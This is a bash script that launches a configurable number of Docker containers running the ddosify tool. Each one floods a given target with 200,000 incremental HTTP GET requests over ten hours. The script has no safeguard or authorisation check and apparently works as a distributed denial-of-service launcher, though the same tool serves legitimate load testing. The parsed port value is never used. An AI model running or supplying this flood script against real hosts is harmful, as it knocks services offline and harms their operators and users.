#!/bin/bash
COUNT=10
PORT='443'

RED='\033[0;31m'
LGREEN='\033[1;32m'
CYAN='\033[0;36m'
NC='\033[0m'

while getopts t:p:c:f: flag
do
    case "${flag}" in
        t) TARGET=${OPTARG};;
        p) let PORT=${OPTARG};;
        c) let COUNT=${OPTARG};;
    esac
done

echo -e "Starting ${LGREEN}$COUNT${NC} containers on ${CYAN}$TARGET${NC}:${RED}$PORT${NC}"

while [ $COUNT -gt 0 ]; do
    let COUNT=COUNT-1
    docker run -d --rm ddosify/ddosify ddosify -t $TARGET -l incremental -n 200000 -d 36000 -p HTTP -m GET -T 10
done

echo 'done'